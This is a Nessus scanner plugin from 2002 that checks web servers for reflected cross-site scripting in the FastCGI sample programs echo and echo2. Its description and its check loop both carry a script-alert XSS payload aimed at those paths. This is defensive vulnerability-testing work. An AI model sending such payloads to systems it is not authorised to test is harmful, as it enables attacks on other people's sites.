#
# This script was written by Matt Moore <matt.moore@westpoint.ltd.uk>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10838);
 script_version ("$Revision: 1.13 $");
 name["english"] = "FastCGI samples Cross Site Scripting";
 name["francais"] = "FastCGI samples Cross Site Scripting";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] =  "
Two sample CGI's supplied with FastCGI are vulnerable 
to cross-site scripting attacks. FastCGI is an 'open extension to CGI 
that provides high performance without the limitations of server 
specific APIs', and is included in the default installation of the 
'Unbreakable' Oracle9i Application Server. Various other web servers 
support the FastCGI extensions (Zeus, Pi3Web etc).

Two sample CGI's are installed with FastCGI, (echo.exe and echo2.exe
under Windows, echo and echo2 under Unix). Both of these CGI's output
a list of environment variables and PATH information for various
applications. They also display any parameters that were provided
to them. Hence, a cross site scripting attack can be performed via
a request such as: 

http://www.someserver.com/fcgi-bin/echo2.exe?blah=<SCRIPT>alert(document.domain)</SCRIPT>  

Solution: 

Always remove sample applications from production servers.

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Tests for FastCGI samples Cross Site Scripting";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 Matt Moore",
		francais:"Ce script est Copyright (C) 2002 Matt Moore");
 family["english"] = "CGI abuses : XSS";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl", "cross_site_scripting.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( get_kb_item("www/" + port + "/generic_xss") ) exit(0);

if(! get_port_state(port)) exit(0);

# Avoid FP against Compaq Web Management or HTTP proxy
if (get_kb_item('Services/www/'+port+'/embedded')) exit(0);

file = make_list("echo", "echo.exe", "echo2", "echo2.exe");
 
for(f = 0; file[f]; f++)
 {
  req = http_get(item:string("/fcgi-bin/", file[f], "?foo=<SCRIPT>alert(document.domain)</SCRIPT>"), port:port);
  r = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
  if ( r == NULL ) exit(0);
  if("<SCRIPT>alert(document.domain)</SCRIPT>" >< r) 
	{
  	security_warning(port);
	exit(0);
	}
 }	

